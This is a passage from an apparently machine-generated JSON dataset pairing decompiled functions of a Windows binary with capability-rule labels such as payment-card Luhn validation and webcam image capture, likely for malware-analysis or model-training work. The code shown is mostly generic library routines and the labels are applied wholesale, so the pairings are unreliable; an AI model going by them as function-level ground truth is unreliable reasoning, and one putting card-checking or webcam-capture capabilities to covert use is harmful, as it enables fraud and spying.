        "decompiled_code": "\nvoid __fastcall fcn.004506a5(code **param_1)\n\n{\n    code **extraout_ECX;\n    code *pcVar1;\n    int32_t unaff_EBP;\n    uint *puVar2;\n    \n    pcVar1 = NULL;\n    *param_1 = vtable.CEnumFormatEtc.0;\n    if ((param_1[9] == NULL) && (param_1[0xc] != NULL)) {\n        puVar2 = param_1[10] + 4;\n        do {\n            (*_sym.imp.ole32.dll_CoTaskMemFree)(*puVar2);\n            pcVar1 = pcVar1 + 1;\n            puVar2 = puVar2 + 5;\n        } while (pcVar1 < param_1[0xc]);\n    }\n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CEnumArray.0;\n    pcVar1 = extraout_ECX[9];\n    *(unaff_EBP + -4) = 0;\n    if (pcVar1 != NULL) {\n        fcn.00430cf1();\n    }\n    if (extraout_ECX[0xd] != NULL) {\n        fcn.004170df(extraout_ECX[10]);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004220a2();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 336
    },
    "0045092e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045092e(uint arg_8h, int16_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    \n    if (arg_ch == NULL) {\n        arg_ch = fcn.004176d0(0, arg_8h, &var_14h);\n        *(arg_ch + 8) = 1;\n    }\n    if (arg_8h != 0) {\n        *arg_ch = arg_8h;\n    }\n    iVar1 = fcn.004507c7(arg_ch, 1);\n    fcn.00459330(iVar1 + 0x14, 0, 0xc);\n    return;\n}\n",
        "token_count": 156
    },
    "004509cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004509cb(int32_t param_1, ushort *param_2)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    ushort *puVar3;\n    \n    if (*(param_1 + 0x30) == *(param_1 + 0x3c)) {\n        iVar1 = (*(param_1 + 0x30) + 10) * 0x14;\n        uVar2 = fcn.004170b4(-(iVar1 >> 0x20 != 0) | iVar1);\n        *(param_1 + 0x3c) = *(param_1 + 0x3c) + 10;\n        fcn.00417b17(uVar2, (*(param_1 + 0x30) + 10) * 0x14, *(param_1 + 0x28), *(param_1 + 0x30) * 0x14);\n        fcn.004170df(*(param_1 + 0x28));\n        *(param_1 + 0x28) = uVar2;\n    }\n    puVar3 = *(param_1 + 0x30) * 0x14 + *(param_1 + 0x28);\n    *puVar3 = *param_2;\n    *(puVar3 + 2) = *(param_2 + 2);\n    *(puVar3 + 4) = *(param_2 + 4);\n    *(puVar3 + 6) = *(param_2 + 6);\n    *(puVar3 + 8) = *(param_2 + 8);\n    *(param_1 + 0x30) = *(param_1 + 0x30) + 1;\n    return;\n}\n",
        "token_count": 388
    },
    "00452d9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452d9e(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uStack48;\n    uchar auStack28 [28];\n    \n    pcVar1 = _sym.imp.USER32.dll_PeekMessageA;\n    while( true ) {\n        uStack48 = 0;\n        iVar2 = (*pcVar1)(&stack0xffffffe4, 0, 0xf, 0xf);\n        if (iVar2 == 0) {\n            *(param_1 + 0x70) = *(*(param_1 + 0x68) + 0x84);\n            *(param_1 + 0x78) = *(*(param_1 + 0x68) + 0x80) & 0xf000;\n            (*_sym.imp.USER32.dll_SetRectEmpty)(param_1 + 0xc);\n            *(param_1 + 0x20) = 0;\n            *(param_1 + 0x1c) = 0;\n            *(param_1 + 0x24) = 0;\n            *(param_1 + 0x7c) = 0;\n            *(param_1 + 0x80) = 0;\n            uVar3 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n            iVar2 = fcn.0041e67e(uVar3);\n            iVar4 = (*_sym.imp.USER32.dll_LockWindowUpdate)(*(iVar2 + 0x20));\n            if (iVar4 == 0) {\n                uVar3 = 3;\n            }\n            else {\n                uVar3 = 0x403;\n            }\n            uVar3 = (*_sym.imp.USER32.dll_GetDCEx)(*(iVar2 + 0x20), 0, uVar3);\n            uVar3 = fcn.0041a27a(uVar3);\n            *(param_1 + 0x84) = uVar3;\n            return;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetMessageA)(&stack0xffffffd0, 0, 0xf, 0xf);\n        if (iVar2 == 0) break;\n        uStack48 = 0x452dd6;\n        (*_sym.imp.USER32.dll_DispatchMessageA)();\n    }\n    return;\n}\n",
        "token_count": 528
    },
    "004531e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004531e0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    fcn.00452e5d(1);\n    (*_sym.imp.USER32.dll_ReleaseCapture)();\n    uVar2 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    iVar3 = fcn.0041e67e(uVar2);\n    (*_sym.imp.USER32.dll_LockWindowUpdate)(0);\n    iVar1 = *(param_1 + 0x84);\n    if (iVar1 != 0) {\n        (*_sym.imp.USER32.dll_ReleaseDC)(*(iVar3 + 0x20), *(iVar1 + 4));\n        *(param_1 + 0x84) = 0;\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00453cbb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00453cbb(uint *param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.004170b4(-(param_2 * 4 >> 0x20 != 0) | param_2 * 4);\n    *param_1 = uVar1;\n    fcn.00459330(uVar1, 0, param_2 << 2);\n    param_1[1] = param_2;\n    return param_1;\n}\n",
        "token_count": 120
    },
    "00453e60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00453e60(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char *arg_ch_00;\n    uint uVar1;\n    int32_t unaff_EBP;\n    char **ppcVar2;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(0x10);\n    uVar1 = fcn.00423280();\n    fcn.00401680(uVar1);\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.00423280();\n    fcn.00401680(uVar1);\n    *(unaff_EBP + -0x14) = 0;\n    if (*(unaff_EBP + 0x14) == -0x80000000) {\n        (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000000, \"CLSID\", 0, 0x20019, unaff_EBP + -0x14);\n    }\n    *(unaff_EBP + -0x18) = *(unaff_EBP + -0x14);\n    ppcVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 2;\n    while (arg_ch_00 = *ppcVar2,  arg_ch_00 != NULL) {\n        ppcVar2 = ppcVar2 + 1;\n        if ((*(unaff_EBP + 0x14) != -0x80000000) || (*arg_ch_00 != '\\0')) {\n            fcn.004441f9(unaff_EBP + -0x10, arg_ch_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n            if ((*(unaff_EBP + 0x14) != -0x80000000) || (*(*(unaff_EBP + -0x10) + -0xc) != 0)) {\n                fcn.00437a7c(*(unaff_EBP + -0x10));\n            }\n        }\n    }\n    fcn.004366f9();\n    fcn.004010d0();\n    fcn.004010d0();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 618
    },
    "004545c1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004545c1(void)\n\n{\n    code **extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint uStackY532;\n    uint in_stack_fffffe08;\n    \n    fcn.00458e78();\n    *extraout_ECX = vtable.COleStreamFile.0;\n    if ((extraout_ECX[4] != NULL) && (extraout_ECX[2] != NULL)) {\n        fcn.00454585();\n    }\n    fcn.004010d0();\n    fcn.00439b0d();\n    *in_FS_OFFSET = uStackY532;\n    fcn.004566a8(in_stack_fffffe08);\n    return;\n}\n",
        "token_count": 154
    },
    "0045520a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0045520a(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    \n    fcn.00459330(&var_3ch, 0, 0x3c);\n    var_30h = 0x28;\n    if (arg_8h == 0) {\n        var_3ch = 0;\n    }\n    else {\n        var_3ch = *(arg_8h + 0x20);\n    }\n    var_38h = arg_ch;\n    var_34h = arg_10h;\n    iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x40a, 0, &var_3ch);\n    if (iVar1 != 0) {\n        uVar2 = fcn.00456177(arg_14h, 0x30, &var_30h, 0x28);\n        fcn.0040e7f0(uVar2);\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 291
    },
    "00455285": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00455285(uint *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    uint uVar2;\n    \n    fcn.00459330(param_1, 0, 0x28);\n    *param_1 = 0x28;\n    if (param_2 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = *(param_2 + 0x20);\n    }\n    if (param_3 == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetParent)(uVar2);\n        param_1[2] = uVar1;\n        param_1[1] = 1;\n        param_1[3] = uVar2;\n    }\n    else {\n        param_1[1] = 0;\n        param_1[2] = uVar2;\n        param_1[3] = param_3;\n    }\n    return;\n}\n",
        "token_count": 224
    },
    "0045594e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "capture webcam image/8f9bddbfc62a47b78ef3c85708336261"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045594e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_40h;\n    int32_t var_1ch;\n    uint var_10h;\n    uint var_ch;\n    uchar uStack12;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    var_10h = arg_8h;\n    fcn.00455285(&var_40h, arg_ch, arg_10h);\n    var_ch = *0x4920b0;\n    uStack12 = *0x4920b4;\n    var_1ch = fcn.00401940(0x405);\n    fcn.00459330(var_1ch, 0, 0x400);\n    uVar1 = fcn.00456177(var_1ch + 0x400, 5, &var_ch, 5);\n    fcn.0040e7f0(uVar1);\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x40b, 0, &var_40h);\n    iVar2 = fcn.0045ac18(&var_ch, var_1ch + 0x400, 5);\n    if (iVar2 != 0) {\n        fcn.00418fe6();\n    }\n    uVar1 = 0xffffffff;\n    fcn.00410110();\n    fcn.004566a8(uVar1);\n    return;\n}\n",
        "token_count": 372
    },
    "00455baf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00455baf(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *unaff_ESI;\n    uint *puVar4;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    iVar3 = 0;\n    puVar4 = unaff_ESI;\n    if (arg_8h != 0) goto code_r0x00455bc3;\n    while( true ) {\n        fcn.0041901a();\n        puVar4 = unaff_ESI;\ncode_r0x00455bc3:\n        if (arg_ch != iVar3) break;\n        unaff_ESI = 0x4920b8;\n        do {\n            arg_8h_00 = *unaff_ESI;\n            iVar2 = fcn.00446d8a(arg_8h_00);\n            if (iVar2 != 0) {\n                uVar1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(arg_8h + 0x20), 0xffffffff, arg_8h_00, puVar4);\n                iVar2 = fcn.0044c061(uVar1);\n                if (0 < iVar2) goto code_r0x00455c2f;\n            }\n            if (((unaff_ESI[1] ^ *(arg_8h + 0x80)) & 0xf000) == 0) {\n                iVar3 = fcn.00446d8a(*unaff_ESI);\n            }\n            unaff_ESI = unaff_ESI + 2;\n        } while (unaff_ESI < 0x4920d8);\n        if (iVar3 != 0) break;\n    }\ncode_r0x00455c2f:\n    fcn.0044ce2e(arg_8h, arg_10h);\n    return;\n}\n",
        "token_count": 436
    },
    "00456858": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00456858(code **param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    \n    *param_1 = vtable.std::exception.0;\n    pcVar3 = *(param_2 + 8);\n    param_1[2] = pcVar3;\n    pcVar1 = *(param_2 + 4);\n    if (pcVar3 == NULL) {\n        param_1[1] = pcVar1;\n    }\n    else if (pcVar1 == NULL) {\n        param_1[1] = NULL;\n    }\n    else {\n        iVar2 = fcn.00458f50(pcVar1);\n        pcVar3 = fcn.004582da(iVar2 + 1);\n        param_1[1] = pcVar3;\n        if (pcVar3 != NULL) {\n            fcn.0045c78f(pcVar3, iVar2 + 1, *(param_2 + 4));\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 243
    },
    "00457e3d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00457e3d(uint param_1, uint param_2)\n\n{\n    fcn.00457de8(fcn.00463bbc, param_1, 0, param_2);\n    return;\n}\n",
        "token_count": 51
    },
    "00457f92": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00457f92(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00457ea1(fcn.00463bbc, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 116
    },
    "004581a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004581a5(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00457ea1(0x46472e, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 116
    },
    "004591a7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004591a7(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.004692e4(arg_8h, arg_ch, arg_10h, arg_14h, &arg_18h);\n    return;\n}\n",
        "token_count": 76
    },
    "0045963b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045963b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.004581a5(arg_8h, arg_ch, arg_10h, arg_14h, &arg_18h);\n    return;\n}\n",
        "token_count": 76
    },
    "0045c40e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0045c40e(int32_t *param_1)\n\n{\n    uint *puVar1;\n    \n    if ((param_1 != NULL) && (*0x4ad508 != 0)) {\n        *param_1 = *0x4ad508;\n        return 0;\n    }\n    puVar1 = fcn.0045924d();\n    *puVar1 = 0x16;\n    fcn.004577e9(0, 0, 0, 0, 0);\n    return 0x16;\n}\n",
        "token_count": 123
    },
    "0045c4bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0045c4bd(uint *param_1)\n\n{\n    uint *puVar1;\n    \n    if ((param_1 != NULL) && (*0x4ad508 != 0)) {\n        *param_1 = *0x4ad514;\n        return 0;\n    }\n    puVar1 = fcn.0045924d();\n    *puVar1 = 0x16;\n    fcn.004577e9(0, 0, 0, 0, 0);\n    return 0x16;\n}\n",
        "token_count": 121
    },
    "0045c89c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045c89c(uint param_1, uint param_2)\n\n{\n    fcn.0045c7f4(0x46ac00, param_2, 0, &stack0x0000000c);\n    return;\n}\n",
        "token_count": 58
    },
    "0045cb56": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045cb56(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.0045cad4(0x469eff, arg_10h, arg_14h, &arg_18h);\n    return;\n}\n",
        "token_count": 74
    },
    "0045cb78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045cb78(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.0045cad4(0x46ac00, param_3, 0, &stack0x00000010);\n    return;\n}\n",
        "token_count": 59
    },
    "0045cb99": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045cb99(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.0045cad4(0x46ac00, arg_10h, arg_14h, &arg_18h);\n    return;\n}\n",
        "token_count": 75
    },
    "00462bb9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00462bb9(uint *param_1)\n\n{\n    uint *puVar1;\n    \n    if (param_1 == NULL) {\n        puVar1 = fcn.0045924d();\n        *puVar1 = 0x16;\n        fcn.004577e9(0, 0, 0, 0, 0);\n        return 0x16;\n    }\n    *param_1 = *0x4aa734;\n    return 0;\n}\n",
        "token_count": 109
    },
    "00462bed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00462bed(uint *param_1)\n\n{\n    uint *puVar1;\n    \n    if (param_1 == NULL) {\n        puVar1 = fcn.0045924d();\n        *puVar1 = 0x16;\n        fcn.004577e9(0, 0, 0, 0, 0);\n        return 0x16;\n    }\n    *param_1 = *0x4aa738;\n    return 0;\n}\n",
        "token_count": 108
    },
    "00462c21": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00462c21(uint *param_1)\n\n{\n    uint *puVar1;\n    \n    if (param_1 == NULL) {\n        puVar1 = fcn.0045924d();\n        *puVar1 = 0x16;\n        fcn.004577e9(0, 0, 0, 0, 0);\n        return 0x16;\n    }\n    *param_1 = *0x4aa730;\n    return 0;\n}\n",
        "token_count": 109
    },
    "004681af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004681c1)\n// WARNING: Removing unreachable block (ram,0x004681c7)\n// WARNING: Removing unreachable block (ram,0x004681c9)\n\nvoid fcn.004681af(void)\n\n{\n    return;\n}\n",
        "token_count": 63
    },
    "004690ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004690ce(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00468fb1(fcn.00468531, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 115
    },
    "004692e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004692e4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00468fb1(0x4767e8, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 117
    },
    "00475dd1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00475dd1(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00475b8d();\n    fcn.00475ce5(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 56
    },
    "0047ab9b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.0047ab9b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00459460(0x4a50a0, 0x10);\n    iVar1 = fcn.00475b8d();\n    iVar1 = iVar1 + 0x20;\n    *(unaff_EBP + -0x1c) = iVar1;\n    if (*(unaff_EBP + 0xc) == 0) {\n        puVar2 = fcn.0045924d();\n        *puVar2 = 0x16;\n        fcn.004577e9(0, 0, 0, 0, 0);\n    }\n    else {\n        fcn.00475c64(iVar1);\n        *(unaff_EBP + -4) = 0;\n        uVar3 = fcn.0047aad6(iVar1);\n        uVar4 = (**(unaff_EBP + 8))(iVar1, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n        *(unaff_EBP + -0x20) = uVar4;\n        fcn.0047ab6c(uVar3, iVar1);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.0047ac23();\n    }\n    fcn.004594a5();\n    return;\n}\n",
        "token_count": 437
    },
    "0048117a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0048117a(uint param_1)\n\n{\n    fcn.00459330(param_1, 0, 0x18);\n    return param_1;\n}\n",
        "token_count": 43
    },
    "0048128c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0048128c(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if ((param_2 < 0) || (iVar1 = param_1[1],  iVar1 <= param_2)) {\n        uVar3 = 0;\n    }\n    else {\n        if (param_2 != iVar1 + -1) {\n            iVar2 = (iVar1 - param_2) * 4;\n            iVar1 = *param_1 + param_2 * 4;\n            fcn.0040e880(iVar1, iVar2, iVar1 + 4, iVar2 + -4);\n        }\n        param_1[1] = param_1[1] + -1;\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 202
    },
    "004814cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004814cd(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    if (param_1[1] == param_1[2]) {\n        if (param_1[2] == 0) {\n            uVar3 = 1;\ncode_r0x004814f3:\n            iVar1 = fcn.0045880f(*param_1, uVar3, 4);\n            if (iVar1 != 0) {\n                param_1[2] = uVar3;\n                *param_1 = iVar1;\n                goto code_r0x00481509;\n            }\n        }\n        else {\n            uVar3 = param_1[1] * 2;\n            if ((-1 < uVar3) && (uVar3 < 0x20000000)) goto code_r0x004814f3;\n        }\n        uVar2 = 0;\n    }\n    else {\ncode_r0x00481509:\n        fcn.004812f6(param_1[1], param_2);\n        param_1[1] = param_1[1] + 1;\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 290
    },
    "0045631a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
